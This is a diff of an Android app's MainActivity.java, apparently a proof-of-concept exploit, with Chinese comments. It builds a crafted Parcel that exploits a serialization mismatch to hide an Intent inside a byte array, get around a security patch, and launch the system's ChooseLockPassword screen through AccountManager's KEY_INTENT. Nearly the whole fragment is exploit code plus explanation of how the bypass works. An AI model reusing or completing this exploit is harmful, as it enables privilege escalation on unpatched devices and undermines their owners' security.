@@ -71,12 +71,14 @@ public class MainActivity extends Activity {
         exp.writeInt(13);//这里的13则也是巧妙地被解析成了VAL_BYTEARRAY（13）
         int intentSizeOffset = exp.dataPosition();
         // 在错位之后上面的13和这里的值就会作为8字节的字节数组，后续就会正常解析出intent元素了，就成功绕过补丁
-        exp.writeInt(123456789);//这里应为字节数组的长度，我们填写为intent元素所占用的长度，即可将intent元素巧妙地隐藏到字节数组中
+        int evilObject = -1;//这里应为字节数组的长度，我们填写为intent元素所占用的长度，即可将intent元素巧妙地隐藏到字节数组中(此值被Intent长度覆盖)
+        exp.writeInt(evilObject);
         int intentStartOffset = exp.dataPosition();
         /**********************恶意构造的内容end*********************************/
         /**********************intent内容start*********************************/
         exp.writeString(AccountManager.KEY_INTENT);
         exp.writeInt(4);// VAL_PARCELABLE
+        //可以直接构造Intent放在exp中，此处为了显示构造过程，将Intent字段逐一放入exp中
         //Intent intent = new Intent(Intent.ACTION_RUN);
         //intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         //intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.password.ChooseLockPassword"));
@@ -109,7 +111,7 @@ public class MainActivity extends Activity {
 
         // 最后一个元素在错位之前会被当成最后一个元素，错位之后就会被忽略，因为前面已经读取的元素数已经足够
         String key3Name = "Padding-Key";
-        //String key3Name = "padding";
+        //String key3Name = "padding";//hashcode排序失败
         exp.writeString(key3Name);
         exp.writeInt(-1);//VAL_NULL
 
